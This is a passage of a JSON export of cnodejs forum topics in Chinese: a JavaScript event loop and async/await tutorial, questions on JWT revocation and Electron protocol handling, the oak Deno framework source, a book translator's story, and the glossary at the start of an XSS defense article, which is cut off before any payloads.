})本身执行完成，并从调用堆栈中删除。</h4>\n<p><img src=\"https://image.fundebug.com/2018-12-19-13.png\" alt></p>\n<h4>8. console.log(‘Bye’) 添加到调用堆栈</h4>\n<p><img src=\"https://image.fundebug.com/2018-12-19-14.png\" alt></p>\n<h4>9. 执行 console.log(‘Bye’)</h4>\n<p><img src=\"https://image.fundebug.com/2018-12-19-15.png\" alt></p>\n<h4>10. console.log(‘Bye’) 从调用调用堆栈移除</h4>\n<p><img src=\"https://image.fundebug.com/2018-12-19-16.png\" alt></p>\n<h4>11. 至少在5秒之后，计时器完成并将cb1回调推到回调队列。</h4>\n<p><img src=\"https://image.fundebug.com/2018-12-19-17.png\" alt></p>\n<h4>12. 事件循环从回调队列中获取cb1并将其推入调用堆栈。</h4>\n<p><img src=\"https://image.fundebug.com/2018-12-19-18.png\" alt></p>\n<h4>13. 执行cb1并将console.log(‘cb1’)添加到调用堆栈。</h4>\n<p><img src=\"https://image.fundebug.com/2018-12-19-19.png\" alt></p>\n<h4>14. 执行 console.log(‘cb1’)</h4>\n<p><img src=\"https://image.fundebug.com/2018-12-19-20.png\" alt></p>\n<h4>15. console.log(‘cb1’) 从调用堆栈中移除</h4>\n<p><img src=\"https://image.fundebug.com/2018-12-19-21.png\" alt></p>\n<h4>16. cb1 从调用堆栈中移除</h4>\n<p><img src=\"https://image.fundebug.com/2018-12-19-22.png\" alt></p>\n<p><strong>快速回顾：</strong></p>\n<p><img src=\"https://image.fundebug.com/2018-12-19-23.gif\" alt></p>\n<p>值得注意的是，<code>ES6</code>指定了事件循环应该如何工作，这意味着在技术上它属于JS引擎的职责范围，不再仅仅扮演宿主环境的角色。这种变化的一个主要原因是<code>ES6</code>中引入了<code>Promises</code>，因为<code>ES6</code>需要对事件循环队列上的调度操作进行直接、细度的控制。</p>\n<h3>setTimeout(…) 是怎么工作的</h3>\n<p>需要注意的是，setTimeout(…)不会自动将回调放到事件循环队列中。它设置了一个计时器。当计时器过期时，环境将回调放到事件循环中，以便将来某个**标记(tick)**将接收并执行它。请看下面的代码:</p>\n<pre class=\"prettyprint language-javascript\"><code>setTimeout(myCallback, 1000);\n</code></pre><p>这并不意味着<code>myCallback</code>将在1000毫秒后就立马执行，而是在1000毫秒后，<code>myCallback</code>被添加到队列中。但是，如果队列有其他事件在前面添加回调刚必须等待前后的执行完后在执行<code>myCallback</code>。</p>\n<p>有不少的文章和教程上开始使用异步JavaScript代码，建议用<code>setTimeout(回调,0)</code>，现在你知道事件循环和<code>setTimeout</code>是如何工作的：调用setTimeout 0毫秒作为第二个参数只是推迟回调将它放到回调队列中，直到调用堆栈是空的。</p>\n<p>请看下面的代码:</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(&#x27;Hi&#x27;);\nsetTimeout(function() {\n    console.log(&#x27;callback&#x27;);\n}, 0);\nconsole.log(&#x27;Bye&#x27;);\n</code></pre><p>虽然等待时间被设置为0 ms，但在浏览器控制台的结果如下:</p>\n<pre class=\"prettyprint language-javascript\"><code>Hi\nBye\ncallback\n</code></pre><h3>ES6的任务队列是什么?</h3>\n<p><code>ES6</code>中引入了一个名为“任务队列”的概念。它是事件循环队列上的一个层。最为常见在<code>Promises</code> 处理的异步方式。</p>\n<p>现在只讨论这个概念，以便在讨论带有<code>Promises</code>的异步行为时，能够了解 Promises 是如何调度和处理。</p>\n<p>想像一下：任务队列是一个附加到事件循环队列中每个标记末尾的队列。某些异步操作可能发生在事件循环的一个标记期间，不会导致一个全新的事件被添加到事件循环队列中，而是将一个项目(即任务)添加到当前标记的任务队列的末尾。</p>\n<p>这意味着可以放心添加另一个功能以便稍后执行，它将在其他任何事情之前立即执行。</p>\n<p>任务还可能创建更多任务添加到同一队列的末尾。理论上，任务“循环”(不断添加其他任务的任等等)可以无限运行，从而使程序无法获得转移到下一个事件循环标记的必要资源。从概念上讲，这类似于在代码中表示长时间运行或无限循环(如while (true) …)。</p>\n<p>任务有点像 setTimeout(callback, 0) “hack”，但其实现方式是引入一个定义更明确、更有保证的顺序：稍后，但越快越好。</p>\n<h3>回调</h3>\n<p>正如你已经知道的，回调是到目前为止<code>JavaScript</code>程序中表达和管理异步最常见的方法。实际上，回调是<code>JavaScript</code>语言中最基本的异步模式。无数的<code>JS</code>程序，甚至是非常复杂的程序，除了一些基本都是在回调异步基础上编写的。</p>\n<p>然而回调方式还是有一些缺点，许多开发人员都在试图找到更好的异步模式。但是，如果不了解底层的内容，就不可能有效地使用任何抽象出来的异步模式。</p>\n<p>在下一章中，我们将深入探讨这些抽象，以说明为什么更复杂的异步模式(将在后续文章中讨论)是必要的，甚至是值得推荐的。</p>\n<h3>嵌套回调</h3>\n<p>请看以下代码:</p>\n<p><img src=\"https://image.fundebug.com/2018-12-19-24.png\" alt></p>\n<p>我们有一个由三个函数组成的链嵌套在一起，每个函数表示异步系列中的一个步骤。</p>\n<p>这种代码通常被称为“回调地狱”。但是“回调地狱”实际上与嵌套/缩进几乎没有任何关系，这是一个更深层次的问题。</p>\n<p>首先，我们等待“单击”事件，然后等待计时器触发，然后等待Ajax响应返回，此时可能会再次重复所有操作。</p>\n<p>乍一看，这段代码似乎可以将其异步性自然地对应到以下顺序步骤:</p>\n<pre class=\"prettyprint language-javascript\"><code>listen(&#x27;click&#x27;, function (e) {\n    &#x2F;&#x2F; ..\n});\n</code></pre><p>然后：</p>\n<pre class=\"prettyprint language-javascript\"><code>setTimeout(function(){\n    &#x2F;&#x2F; ..\n}, 500);\n</code></pre><p>接着：</p>\n<pre class=\"prettyprint language-javascript\"><code>ajax(&#x27;https:&#x2F;&#x2F;api.example.com&#x2F;endpoint&#x27;, function (text){\n    &#x2F;&#x2F; ..\n});\n</code></pre><p>最后：</p>\n<pre class=\"prettyprint language-javascript\"><code>if (text == &quot;hello&quot;) {\n    doSomething();\n}\nelse if (text == &quot;world&quot;) {\n    doSomethingElse();\n}\n</code></pre><p>因此，这种连续的方式来表示异步代码似乎更自然，不是吗?一定有这样的方法，对吧?</p>\n<h3>Promises</h3>\n<p>请看下面的代码:</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\nvar y = 2;\nconsole.log(x + y);\n</code></pre><p>这非常简单：它对<code>x</code>和<code>y</code>的值进行求和，并将其打印到控制台。但是，如果<code>x</code>或<code>y</code>的值丢失了，仍然需要求值，要怎么办?</p>\n<p>例如，需要从服务器取回<code>x</code>和<code>y</code>的值，然后才能在表达式中使用它们。假设我们有一个函数<code>loadX</code>和<code>loadY``，它们分别从服务器加载</code>x<code>和</code>y<code>的值。然后，一旦</code>x<code>和</code>y<code>都被加载，假设我们有一个函数</code>sum<code>，它对</code>x<code>和</code>y`的值进行求和。</p>\n<p><strong>它可能看起来像这样(很丑，不是吗?)</strong></p>\n<p><img src=\"https://image.fundebug.com/2018-12-19-25.png\" alt></p>\n<p>这里有一些非常重要的事情——在这个代码片段中，我们将x和y作为异步获取的的值，并且执行了一个函数sum(…)(从外部)，它不关心x或y，也不关心它们是否立即可用。</p>\n<p>当然，这种基于回调的粗略方法还有很多不足之处。 这只是一个我们不必判断对于异步请求的值的处理方式一个小步骤而已。</p>\n<h3>Promise Value</h3>\n<p>用Promise来重写上例:</p>\n<p><img src=\"https://image.fundebug.com/2018-12-19-26.png\" alt></p>\n<p>在这个代码片段中有两层Promise。</p>\n<p><code>fetchX</code> 和 <code>fetchY</code> 先直接调用，返回一个promise，传给 <code>sum</code>。 <code>sum</code> 创建并返回一个Promise，通过调用 then 等待 Promise，完成后，sum 已经准备好了（resolve），将会打印出来。</p>\n<p>第二层是 <code>sum(…)</code> 创建的 Promise ( 通过 Promise.all([ … ]) )然后返回 Promise，通过调用then(…)来等待。当 <code>sum(…)</code> 操作完成时，sum 传入的两个 Promise 都执行完后，可以打印出来了。这里隐藏了在<code>sum(…)</code>中等待<code>x</code>和<code>y</code>未来值的逻辑。</p>\n<p>**注意：**在sum（…）内，Promise.all（[…]）调用创建一个 promise（等待 promiseX 和 promiseY 解析）。 然后链式调用 .then（…）方法里再的创建了另一个 Promise，然后把 返回的 x 和 和（values[0] + values[1]） 进行求和 并返回 。</p>\n<p>因此，我们在sum（…）末尾调用then（…）方法  —  实际上是在返回的第二个 Pwwromise 上运行，而不是由Promise.all([ … ])创建 Promise。 此外，虽然没有在第二个 Promise 结束时再调用 then方法 ，其时这里也创建一个 Promise。</p>\n<p>Promise.then(…) 实际上可以使用两个函数，第一个函数用于执行成功的操作，第二个函数用于处理失败的操作：</p>\n<p>如果在获取<code>x</code>或<code>y</code>时出现错误，或者在添加过程中出现某种失败，<code>sum(…)</code> 返回的 Promise将被拒绝，传递给 then(…) 的第二个回调错误处理程序将从 Promise 接收失败的信息。</p>\n<p>从外部看，由于 Promise 封装了依赖于时间的状态（等待底层值的完成或拒绝，Promise 本身是与时间无关的），它可以按照可预测的方式组成，不需要开发者关心时序或底层的结果。一旦 Promise 决议，此刻它就成为了外部不可变的值。</p>\n<p><strong>可链接调用 Promise 真的很有用：</strong></p>\n<p>创建一个延迟2000ms内完成的 Promise ，然后我们从第一个then（…）回调中返回，这会导致第二个then（…）等待 2000ms。</p>\n<blockquote>\n<p>注意：因为Promise 一旦被解析，它在外部是不可变的，所以现在可以安全地将该值传递给任何一方，因为它不能被意外地或恶意地修改，这一点在多方遵守承诺的决议时尤其正确。一方不可能影响另一方遵守承诺决议的能力，不变性听起来像是一个学术话题，但它实际上是承诺设计最基本和最重要的方面之一，不应该被随意忽略。</p>\n</blockquote>\n<h3>使用 Promise 还是不用？</h3>\n<p>关于 Promise 的一个重要细节是要确定某个值是否是一个实际的Promise 。换句话说，它是否具有像Promise 一样行为？</p>\n<p>我们知道 Promise 是由<code>new Promise(…)</code>语法构造的，你可能认为`` p instanceof Promise`是一个足够可以判断的类型，嗯,不完全是。</p>\n<p>这主要是因为可以从另一个浏览器窗口(例如iframe)接收 Promise 值，而该窗口或框架具有自己的 Promise 值，与当前窗口或框架中的 Promise 值不同，所以该检查将无法识别 Promise 实例。</p>\n<p>此外，库或框架可以选择性的封装自己的 Promise，而不使用原生 ES6 的Promise 来实现。事实上，很可能在老浏览器的库中没有 Promise。</p>\n<h3>吞掉错误或异常</h3>\n<p>如果在 Promise 创建中，出现了一个javascript一场错误(TypeError 或者 ReferenceError)，这个异常会被捕捉，并且使这个 promise 被拒绝。</p>\n<p>但是，如果在调用 then(…) 方法中出现了 JS 异常错误，那么会发生什么情况呢?即使它不会丢失，你可能会发现它们的处理方式有点令人吃惊，直到你挖得更深一点:</p>\n<p><img src=\"https://image.fundebug.com/2018-12-19-27.png\" alt></p>\n<p>看起来<code>foo.bar()</code>中的异常确实被吞噬了，不过,它不是。然而，还有一些更深层次的问题，我们没有注意到。 p.then(…) 调用本身返回另一个 Promise，该 Promise 将被 TypeError 异常拒绝。</p>\n<h2>处理未捕获异常</h2>\n<p>许多人会说，还有其他更好的方法。</p>\n<p>一个常见的建议是，Promise 应该添加一个 <code>done(…)</code>，这实际上是将 Promise 链标记为 <code>“done”</code>。done(…) 不会创建并返回 Promise ，因此传递给 done(…) 的回调显然不会将问题报告给不存在的链接 Promise 。</p>\n<p>Promise 对象的回调链，不管以 then 方法或 catch 方法结尾，要是最后一个方法抛出错误，都有可能无法捕捉到（因为 Promise 内部的错误不会冒泡到全局）。因此，我们可以提供一个 done 方法，总是处于回调链的尾端，保证抛出任何可能出现的错误。</p>\n<p><img src=\"https://image.fundebug.com/2018-12-19-28.png\" alt></p>\n<h3>ES8中改进了什么 ?Async/await （异步/等待）</h3>\n<p>JavaScript ES8引入了 <code>async/await</code>，这使得使用 Promise 的工作更容易。这里将简要介绍async/await 提供的可能性以及如何利用它们编写异步代码。</p>\n<p>使用 async 声明异步函数。这个函数返回一个 <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/AsyncFunction\">AsyncFunction</a> 对象。AsyncFunction 对象表示该函数中包含的代码的异步函数。</p>\n<p>调用使用 async 声明函数时，它返回一个 Promise。当这个函数返回一个值时，这个值只是一个普通值而已，这个函数内部将自动创建一个承诺，并使用函数返回的值进行解析。当这个函数抛出异常时，Promise 将被抛出的值拒绝。</p>\n<p>使用 async 声明函数时可以包含一个 await 符号，await 暂停这个函数的执行并等待传递的 Promise 的解析完成，然后恢复这个函数的执行并返回解析后的值。</p>\n<blockquote>\n<p>async/wait 的目的是简化使用承诺的行为</p>\n</blockquote>\n<p>让看看下面的例子:</p>\n<pre class=\"prettyprint language-javascript\"><code>function getNumber1() {\n    return Promise.resolve(&#x27;374&#x27;);\n}\n&#x2F;&#x2F; 这个函数与getNumber1相同\nasync function getNumber2() {\n    return 374;\n}\n</code></pre><p>类似地，抛出异常的函数等价于返回被拒绝的 Promise 的函数:</p>\n<pre class=\"prettyprint language-javascript\"><code>function f1() {\n    return Promise.reject(&#x27;Some error&#x27;);\n}\nasync function f2() {\n    throw &#x27;Some error&#x27;;\n}\n</code></pre><p><code>await</code> 关键字只能在异步函数中使用，并允许同步等待 Promise。如果在 async 函数之外使用 Promise，仍然需要使用 then 回调:</p>\n<p><img src=\"https://image.fundebug.com/2018-12-19-29.png\" alt></p>\n<p>还可以使用“异步函数表达式”定义异步函数。异步函数表达式与异步函数语句非常相似，语法也几乎相同。异步函数表达式和异步函数语句之间的主要区别是函数名，可以在异步函数表达式中省略函数名来创建匿名函数。异步函数表达式可以用作生命(立即调用的函数表达式)，一旦定义它就会运行。</p>\n<pre class=\"prettyprint language-javascript\"><code>var loadData = async function() {\n    &#x2F;&#x2F; &#96;rp&#96; is a request-promise function.\n    var promise1 = rp(&#x27;https:&#x2F;&#x2F;api.example.com&#x2F;endpoint1&#x27;);\n    var promise2 = rp(&#x27;https:&#x2F;&#x2F;api.example.com&#x2F;endpoint2&#x27;);\n   \n    &#x2F;&#x2F; Currently, both requests are fired, concurrently and\n    &#x2F;&#x2F; now we&#x27;ll have to wait for them to finish\n    var response1 = await promise1;\n    var response2 = await promise2;\n    return response1 + &#x27; &#x27; + response2;\n}\n</code></pre><p>更重要的是，在所有主流的浏览器都支持 async/await:</p>\n<p><img src=\"https://image.fundebug.com/2018-12-19-30.png\" alt></p>\n<p>最后，重要的是不要盲目选择编写异步代码的“最新”方法。理解异步 JavaScript 的内部结构非常重要，了解为什么异步JavaScript如此关键，并深入理解所选择的方法的内部结构。与编程中的其他方法一样，每种方法都有优点和缺点。</p>\n<h3>编写高度可维护性、非易碎异步代码的5个技巧</h3>\n<h4>1. 简化代码:</h4>\n<p>使用 async/await 可以编写更少的代码。 每次使用 async/await时，都会跳过一些不必要的步骤：使用.then，创建一个匿名函数来处理响应，例如：**</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; rp是一个请求 Promise 函数。\nrp(‘https:&#x2F;&#x2F;api.example.com&#x2F;endpoint1&#x27;).then(function(data) {\n    &#x2F;&#x2F; …\n});\n</code></pre><p>和：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; &#96;rp&#96; is a request-promise function.\nvar response = await rp(‘https:&#x2F;&#x2F;api.example.com&#x2F;endpoint1&#x27;);\n</code></pre><h4>2. 错误处理</h4>\n<p>Async/wait 可以使用相同的代码结构(众所周知的try/catch语句)处理同步和异步错误。看看它是如何与 Promise 结合的:**</p>\n<pre class=\"prettyprint\"><code>function loadData() {\n    try { &#x2F;&#x2F; Catches synchronous errors.\n        getJSON().then(function(response) {\n            var parsed = JSON.parse(response);\n            console.log(parsed);\n        }).catch(function(e) { &#x2F;&#x2F; Catches asynchronous errors\n            console.log(e); \n        });\n    } catch(e) {\n        console.log(e);\n    }\n}\n</code></pre><p>与</p>\n<pre class=\"prettyprint language-javascript\"><code>async function loadData() {\n    try {\n        var data = JSON.parse(await getJSON());\n        console.log(data);\n    } catch(e) {\n        console.log(e);\n    }\n}\n</code></pre><h4>3. 条件</h4>\n<p>用async/ wait编写条件代码要简单得多:</p>\n<pre class=\"prettyprint language-javascript\"><code>function loadData() {\n  return getJSON()\n    .then(function(response) {\n      if (response.needsAnotherRequest) {\n        return makeAnotherRequest(response)\n          .then(function(anotherResponse) {\n            console.log(anotherResponse)\n            return anotherResponse\n          })\n      } else {\n        console.log(response)\n        return response\n      }\n    })\n}\n</code></pre><p>与</p>\n<pre class=\"prettyprint language-javascript\"><code>async function loadData() {\n  var response = await getJSON();\n  if (response.needsAnotherRequest) {\n    var anotherResponse = await makeAnotherRequest(response);\n    console.log(anotherResponse)\n    return anotherResponse\n  } else {\n    console.log(response);\n    return response;    \n  }\n}\n</code></pre><h4>4. 错误堆栈</h4>\n<p>与 async/await不同，从 Promise 链返回的错误堆栈不提供错误发生在哪里。看看下面这些</p>\n<pre class=\"prettyprint language-javascript\"><code>function loadData() {\n  return callAPromise()\n    .then(callback1)\n    .then(callback2)\n    .then(callback3)\n    .then(() =&gt; {\n      throw new Error(&quot;boom&quot;);\n    })\n}\nloadData()\n  .catch(function(e) {\n    console.log(err);\n&#x2F;&#x2F; Error: boom at callAPromise.then.then.then.then (index.js:8:13)\n});\n</code></pre><p>与：</p>\n<pre class=\"prettyprint language-javascript\"><code>async function loadData() {\n  await callAPromise1()\n  await callAPromise2()\n  await callAPromise3()\n  await callAPromise4()\n  await callAPromise5()\n  throw new Error(&quot;boom&quot;);\n}\nloadData()\n  .catch(function(e) {\n    console.log(err);\n    &#x2F;&#x2F; output\n    &#x2F;&#x2F; Error: boom at loadData (index.js:7:9)\n});\n</code></pre><h4>5. 调试</h4>\n<p>如果你使用过 Promise ，那么你知道调试它们是一场噩梦。例如，如果在一个程序中设置了一个断点，然后阻塞并使用调试快捷方式(如“停止”)，调试器将不会移动到下面，因为它只“逐步”执行同步代码。使用async/wait，您可以逐步完成wait调用，就像它们是正常的同步函数一样。</p>\n<p><strong>编辑中可能存在的bug没法实时知道，事后为了解决这些bug,花了大量的时间进行log 调试，这边顺便给大家推荐一个好用的BUG监控工具Fundebug。</strong></p>\n<p><strong>原文：<a href=\"https://blog.sessionstack.com\">https://blog.sessionstack.com</a>…</strong></p>\n<p><strong>你的点赞是我持续分享好东西的动力，欢迎点赞！</strong></p>\n<p><strong>一个笨笨的码农，我的世界只能终身学习！</strong></p>\n<p>**更多内容请关注公众号《大迁世界》！</p>\n<h3>关于Fundebug</h3>\n<p><a href=\"https://www.fundebug.com/\">Fundebug</a>专注于JavaScript、微信小程序、微信小游戏、支付宝小程序、React Native、Node.js和Java实时BUG监控。 自从2016年双十一正式上线，Fundebug累计处理了9亿+错误事件，得到了Google、360、金山软件、百姓网等众多知名用户的认可。欢迎免费试用！</p>\n<p><img src=\"https://static.fundebug.cn/wechat_slogan.png\" alt></p>\n</div>","title":"JavaScript是如何工作的：事件循环和异步编程的崛起 + 5种使用 async/await 更好地编码方式！","last_reply_at":"2018-12-19T01:41:05.375Z","good":false,"top":false,"reply_count":0,"visit_count":537,"create_at":"2018-12-19T01:41:05.375Z","author":{"loginname":"Fundebug","avatar_url":"https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"}},{"id":"5c1964103898674067a75b97","author_id":"5b376dfcac8bc1e124114500","tab":"ask","content":"<div class=\"markdown-text\"><p><strong>不想用 redis，不想存到 RAM 里。</strong></p>\n<h1>想到的最简单的解决方法：</h1>\n<p>在你的 user 数据库里加上一列 tokenDate</p>\n<table>\n<thead>\n<tr>\n<th>User table</th>\n<th>Data tyle</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>username</td>\n<td>STRING</td>\n</tr>\n<tr>\n<td>password</td>\n<td>STRING</td>\n</tr>\n<tr>\n<td>tokenDate</td>\n<td>DATE (timestamp)</td>\n</tr>\n</tbody>\n</table>\n<p>每次生成 jsonwebtoken 的时候也把 tokenDate 打包进去。\ntokenDate 的值会在每次 用户登入，退出或者修改密码的时候更新成最新的 timestamp。\n就这样我们每次收到用户的 token 的时候查看 tokenDate 是否和我们数据库保存的一致，如果不一致说明这个token已经废除</p>\n<h2>缺点很明显</h2>\n<p><strong>增加数据库查询</strong>，虽然是个快速简单的查询，但是 (简单) x (很多很多很多个请求) = ‘这是个问题’</p>\n<h2>各位有什么好的方法？</h2>\n</div>","title":"有没有什么好的 jsonwebtoken 退出或者修改密码注销token方法？","last_reply_at":"2018-12-19T01:11:32.314Z","good":false,"top":false,"reply_count":3,"visit_count":742,"create_at":"2018-12-18T21:18:08.397Z","author":{"loginname":"tmirun","avatar_url":"https://avatars1.githubusercontent.com/u/8052536?v=4&s=120"}},{"id":"5c18d1f17ec239239ff58273","author_id":"58a654e75b904b25651b3677","tab":"ask","content":"<div class=\"markdown-text\"><p>exe是electron写的，安装后自动注册到windows注册表，注册表主要是加了url protocol功能；来支持网页端js的调用打开</p>\n<p>目前js调用的代码为  &lt;a href=‘cloud://token=123123123123123&amp;jobId=278’&gt;打开桌面端&lt;/a&gt;</p>\n<p>现在每次点这个链接，都新打开个exe，启动了个新的进程</p>\n<p>我想若exe已打开，就不启新的exe了，直接执行任务；</p>\n<p>请教大佬们这个需求如何实现</p>\n<p>ps:我看百度网盘网页端可以检测到exe已打开，并不是新启一个exe</p>\n</div>","title":"请教网页中调用桌面端exe，若exe已打开，则直接执行任务；否则打开个新的exe执行任务","last_reply_at":"2018-12-19T01:06:08.783Z","good":false,"top":false,"reply_count":2,"visit_count":619,"create_at":"2018-12-18T10:54:41.878Z","author":{"loginname":"shuaishenk","avatar_url":"https://avatars3.githubusercontent.com/u/3381855?v=4&s=120"}},{"id":"5c11f8f97ec239239ff56690","author_id":"5a9e3400ce4a27f867526ddd","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p><a href=\"https://github.com/kitsonk/oak\">https://github.com/kitsonk/oak</a></p>\n</blockquote>\n<p>node   ==&gt;  deno\n||                  ||\nkoa    ==&gt;   oak</p>\n<p>名字只是调换了字母的顺序</p>\n<p>代码更加精简，惊叹deno的更新速度，越来越完善</p>\n<p>核心代码只有 application.ts，compose原来是外部引用的，现在直接写在里面。</p>\n<pre class=\"prettyprint language-\"><code>&#x2F;* application.ts *&#x2F;\nimport { Context } from &quot;.&#x2F;context&quot;;\nimport { serve } from &quot;.&#x2F;deps&quot;;\n\nexport interface Middleware {\n  (context: Context, next: () =&gt; Promise&lt;void&gt;): Promise&lt;void&gt; | void;\n}\n\nfunction compose(\n  middleware: Middleware[]\n): (context: Context) =&gt; Promise&lt;void&gt; {\n  return function(context: Context, next?: () =&gt; Promise&lt;void&gt;) {\n    let index = -1;\n    async function dispatch(i: number) {\n      if (i &lt;= index) {\n        throw new Error(&quot;next() called multiple times.&quot;);\n      }\n      index = i;\n      let fn: Middleware | undefined = middleware[i];\n      if (i === middleware.length) {\n        fn = next;\n      }\n      if (!fn) {\n        return;\n      }\n      return fn(context, dispatch.bind(null, i + 1));\n    }\n    return dispatch(0);\n  };\n}\n\nexport class Application {\n  private _middleware: Middleware[] = [];\n\n  async listen(addr: string): Promise&lt;void&gt; {\n    const middleware = compose(this._middleware);\n    const server = serve(addr);\n    for await (const request of server) {\n      const context = new Context(request);\n      await middleware(context);\n      await request.respond(context.response.toServerResponse());\n    }\n  }\n\n  use(middleware: Middleware): this {\n    this._middleware.push(middleware);\n    return this;\n  }\n}\n</code></pre></div>","title":"deno的koa框架oak","last_reply_at":"2018-12-18T22:14:16.534Z","good":false,"top":false,"reply_count":28,"visit_count":1844,"create_at":"2018-12-13T06:15:21.040Z","author":{"loginname":"fuxingZhang","avatar_url":"https://avatars3.githubusercontent.com/u/25921552?v=4&s=120"}},{"id":"5c0dd594f3d48d2397c0f86c","author_id":"5372465f3c72496d41009adc","tab":"share","content":"<div class=\"markdown-text\"><p>《Node.js 开发实战》在十一月底出版上市了，这是我翻译的第一本书，严格的说，这是集体的成果，我是译者之一。</p>\n<h3>为什么翻译</h3>\n<p>我最早的翻译工作要追溯到 2015 年，那时候刚开始学 React，出于对新鲜技术的极大热情，我翻译了 React 入门和 Flux 入门两篇教程。当时 React 相关的中文资源还不像现在这么丰富，我英文也不太好，偶而读到好的英文资料，很多地方需要查词典，后来就想着干脆翻译成中文吧，这样可以逼着自己把英文原文全部搞懂。到目前为止产出的翻译文章不多，但正是从那时开始不那么惧怕看英文文章，尽管阅读速度慢，却也经常有意外收获。</p>\n<p>一个偶然的机遇，我得到了参与翻译这本书的机会。在那之前我从来没有看过它的英文原版，不过看了试读章节之后，感觉如果能把这本书引进到国内，应该是很有意义的。（市面上有一本同名的清华大学出版的《Node.js 开发实战》，本书跟它有本质不同，大家注意区分哈）。Node.js 相关的中文书一直以来都比较匮乏，个人认为最好的两本是《深入浅出 Node.js》和 《Node.js 实战》。</p>\n<p><img src=\"//static.cnodejs.org/Fi1J4ucnqdxmhNWY0clozjuqHUx7\" alt=\"node.js books\"></p>\n<p>其中朴大大的《深入浅出 Node.js》应该是人气最高同时也是质量最好的一本，这本书偏重讲 Node.js 的原理。偏工程应用的书中，个人认为《Node.js 实战》（人民邮电出版社引进）是非常值得一看。而本书《Node.js 开发实战》与前者最大的区别是，前者更专注于 Node.js 的 Web 应用领域，而本书则涵盖了命令行工具、文件操作、Socket 编程等其它常见领域的实战实例，当然其中同样也有大量 Web 开发相关的介绍。</p>\n<p>除了对这本书的价值的认同，还有一个私心是为了提高英文水平，因为当时已经在着手准备出国的事情，心想这也许能借这机会提升一下英语吧。然而等到发现这玩意其实提升的不是英文而是中文，已经是后来的故事了🤦🏻‍。</p>\n<h3>翻译历程</h3>\n<p>要说翻译过程，绝对是无比煎熬。</p>\n<p>首先是时间进度上的煎熬。刚开始那段时间我正在准备出国工作，要上班又要同时准备国外的简历和面试，只有很少的时间能做翻译，导致早期欠了很多债。后来过年期间在老家还经常去咖啡馆翻译。最后收尾阶段的一个月左右，我刚到新加坡入职新公司，那一个月我还没来得及适应新环境，空余时间除了出去看房租房，其它时间几乎所有的晚上和周末都在翻译。</p>\n<p>除了时间，更痛苦的是要保证翻译质量，克服翻译腔，翻译成中文语句流畅的同时不脱离原意。有过翻译经历的应该都有体会，翻译中最痛苦的莫过于，句子中每一个词都认识，整句的意思也都明白，但经常脑回路打结，翻译成中文就怎么都不通顺，很多时候无法找到完全对应的表达。科技类的英文通常比较简单直接，没有太多复杂的难句，通常只要单词都认识就能读懂大部分内容，所以瓶颈通常不在英语水平，而在中文水平。翻译过程中经常会感到词穷，无法找到贴切的词汇和句式来表达，分分钟想打电话给语文老师。</p>\n<p>还有“翻译腔”也是很头疼的问题。自己翻译完的句子，一两天后回过头再看就会觉得有非常浓的翻译腔。这里我说的翻译腔，不是指“哦，见鬼，该死的玛利亚，看在上帝的份上饶了他吧”这样的电影翻译腔。而是中文和英文之间在句子构造和表达习惯上有很大区别，翻译过程中经常沉浸在英文的语境之中，转换成中文时虽然单词变成了中文，但思维方式还没有从英文抽离出来，容易写出带翻译腔的句子，这种情况经常只有事后重读译文才能发现。</p>\n<p>在历经千辛万苦、饱受心理生理灵魂折磨之后，终于赶在约定截止日期之后一个月成功交稿🤣。又经过几个月的出版社老师的辛苦工作，这本书终于跟大家见面了🎉。</p>\n<p>写完这篇流水账，新年也快到了，我也该收拾行李，继续上路了。</p>\n<p>链接：天猫 <a href=\"https://detail.tmall.com/item.htm?id=582316476099\">点这里</a>，京东 <a href=\"https://item.jd.com/12460185.html\">点这里</a>，豆瓣 <a href=\"https://book.douban.com/subject/30373587/\">点这里</a></p>\n<p><img src=\"//static.cnodejs.org/Ftcyn5OyZ-DB3bX74oyRDsuT26qd\" alt=\"node.js the right way\"></p>\n</div>","title":"《Node.js 开发实战》翻译历程","last_reply_at":"2018-12-18T16:33:44.672Z","good":false,"top":false,"reply_count":6,"visit_count":1791,"create_at":"2018-12-10T02:55:16.162Z","author":{"loginname":"meikidd","avatar_url":"https://avatars0.githubusercontent.com/u/376338?v=4&s=120"}},{"id":"5c17c952f3d48d2397c1237f","author_id":"5bd0f81b89665c365e94427c","tab":"ask","content":"<div class=\"markdown-text\"><p>调用cnodejs的 ’post /topic_collect/de_collect 取消主题‘ 功能，返回值一直是{success:false}，一直删除失败，希望大神们帮忙解答一下</p>\n</div>","title":"cnodejs api 无法删除主题","last_reply_at":"2018-12-18T12:07:28.157Z","good":false,"top":false,"reply_count":2,"visit_count":588,"create_at":"2018-12-17T16:05:38.135Z","author":{"loginname":"heidudu","avatar_url":"https://avatars2.githubusercontent.com/u/30767924?v=4&s=120"}},{"id":"5c186faef3d48d2397c12582","author_id":"5c176d22f3d48d2397c12134","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文由云+社区发表</p>\n</blockquote>\n<p>本篇包含了XSS漏洞攻击及防御详细介绍，包括漏洞基础、XSS基础、编码基础、XSS Payload、XSS攻击防御。</p>\n<hr>\n<h2>第一部分：漏洞攻防基础知识</h2>\n<p>XSS属于漏洞攻防，我们要研究它就要了解这个领域的一些行话，这样才好沟通交流。同时我建立了一个简易的攻击模型用于XSS漏洞学习。</p>\n<p><strong>1. 漏洞术语</strong></p>\n<p>了解一些简单术语就好。</p>\n<p><strong>VUL</strong></p>\n<p>Vulnerability漏洞，指能对系统造成损坏或能借之攻击系统的Bug。</p>\n<p><strong>POC</strong></p>\n<p>Proof of Concept，漏洞证明；可以是可以证明漏洞存在的文字描述和截图，但更多的一般是证明漏洞存在的代码；一般不会破坏存在漏洞的系统。</p>\n<p><strong>EXP</strong></p>\n<p>exploit，漏洞利用；利用漏洞攻击系统的代码。</p>\n<p><strong>Payload</strong></p>\n<p>（有效攻击负载）是包含在你用于一次漏洞利用（exploit）中的攻击代码。</p>\n<p><strong>PWN</strong></p>\n<p>是一个黑客语法的俚语词 